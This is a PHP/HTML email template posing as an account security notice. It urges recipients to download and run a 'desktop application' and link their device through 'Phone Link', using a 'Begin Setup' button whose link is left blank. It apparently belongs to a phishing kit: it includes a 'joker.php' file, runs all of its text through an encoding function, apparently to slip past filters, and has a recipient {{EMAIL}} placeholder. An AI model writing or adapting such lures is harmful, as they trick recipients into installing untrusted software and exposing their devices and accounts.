<?php
include 'joker.php';
?>
<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<title><?php echo xTextEncode("Account Security Notice") ?></title>
</head>

<body style="margin:0;background:#f4f6fb;font-family:Arial, Helvetica, sans-serif;">

<table width="100%" cellpadding="0" cellspacing="0" style="padding:30px 10px;">
<tr>
<td align="center">

<!-- Main Card -->
<table width="600" cellpadding="0" cellspacing="0" style="background:#ffffff;border-radius:10px;overflow:hidden;">

<!-- Top -->
<tr>
<td style="padding:18px 20px;text-align:left;border-bottom:1px solid #e6e6e6;">
<span style="margin:0;display:block;">
<a href="#" target="_blank">{{IMG1}}</a>
</span>
</td>
</tr>

<!-- Title -->
<tr>
<td style="padding:24px 30px 12px 30px;">
<h2 style="margin:0;font-size:22px;color:#222;">
<?php echo xTextEncode("Enhance Your Account Protection") ?>
</h2>
<p style="margin:10px 0 0 0;color:#666;font-size:14px;">
<?php echo xTextEncode("Take a brief moment to complete a quick configuration that adds an extra layer of security to your account.") ?>
</p>
</td>
</tr>

<!-- Body -->
<tr>
<td style="padding:10px 30px 22px 30px;color:#333;font-size:15px;line-height:1.7;">

<p style="margin-top:0;margin-bottom:12px;">
<?php echo xTextEncode("To better safeguard your account, download the desktop application and link it with your device. The setup is straightforward and should only require a few minutes.") ?>
</p>

<!-- Steps Row -->
<table width="100%" cellpadding="0" cellspacing="0" style="margin-top:16px;">

<tr>

<td width="50%" valign="top" style="padding-right:10px;">

<p style="margin:0 0 6px 0;"><strong><?php echo xTextEncode("1. Download") ?></strong></p>
<p style="margin:0 0 12px 0;font-size:14px;">
<?php echo xTextEncode("Click the button below to obtain the official desktop application.") ?>
</p>

<p style="margin:0 0 6px 0;"><strong><?php echo xTextEncode("2. Install") ?></strong></p>
<p style="margin:0;font-size:14px;">
<?php echo xTextEncode("Run the downloaded installer file and follow the prompts displayed on your screen.") ?>
</p>

</td>

<td width="50%" valign="top" style="padding-left:10px;">

<p style="margin:0 0 6px 0;"><strong><?php echo xTextEncode("3. Connect") ?></strong></p>
<p style="margin:0 0 10px 0;font-size:14px;">
<?php echo xTextEncode("Once installation is finished, complete the following steps:") ?>
</p>

<ol style="padding-left:18px;margin:0;font-size:14px;">
<li><?php echo xTextEncode("Launch the Phone Link application") ?></li>
<li><?php echo xTextEncode("Choose") ?> <strong><?php echo xTextEncode("\"Link a device\"") ?></strong></li>
<li><?php echo xTextEncode("Verify that your device is successfully connected") ?></li>
</ol>

</td>

</tr>

</table>

<!-- Image -->
<table width="100%" cellpadding="0" cellspacing="0" style="margin-top:20px;">
<tr>
<td align="center">
<span>{{IMG2}}</span>
</td>
</tr>
</table>

<!-- CTA -->
<table width="100%" cellpadding="0" cellspacing="0" style="margin-top:22px;">
<tr>
<td align="center">
<a href="" style="background:#2d63c3;color:#ffffff;text-decoration:none;padding:13px 36px;border-radius:6px;font-size:15px;display:inline-block;">
<strong><?php echo xTextEncode("Begin Setup") ?></strong>
</a>
</td>
</tr>
</table>

</td>
</tr>

</table>

<!-- Info Box -->
<table width="600" cellpadding="0" cellspacing="0" align="center" style="margin-top:16px;background:#ffffff;border-radius:10px;padding:20px;text-align:center;color:#555;font-size:14px;">

<tr>
<td>

<p style="margin:0 0 8px 0;font-size:15px;">
<?php echo xTextEncode("Keep up to date with important alerts and updates about your account.") ?>
</p>

<p style="margin:0 0 10px 0;">
<?php echo xTextEncode("You can change your communication settings or unsubscribe whenever you prefer.") ?>
</p>

<p style="font-size:13px;">
<a href="#" style="color:#2d63c3;text-decoration:none;"><?php echo xTextEncode("Unsubscribe") ?></a> <?php echo xTextEncode("|") ?>
<a href="#" style="color:#2d63c3;text-decoration:none;"><?php echo xTextEncode("Help Center") ?></a>
</p>

</td>
</tr>

</table>

<!-- Footer -->
<table width="600" align="center" cellpadding="0" cellspacing="0" style="margin-top:12px;color:#8a8a8a;font-size:12px;">

<tr>
<td>

<p style="margin:8px 0 0 0;">
<?php echo xTextEncode("This email was delivered to") ?> <strong>{{EMAIL}}</strong><?php echo xTextEncode(".") ?><br>
<?php echo xTextEncode("Please note that this is an automated notification, and responses to this message are not monitored.") ?>
</p>

</td>
</tr>

</table>

</td>
</tr>
</table>

</body>
</html>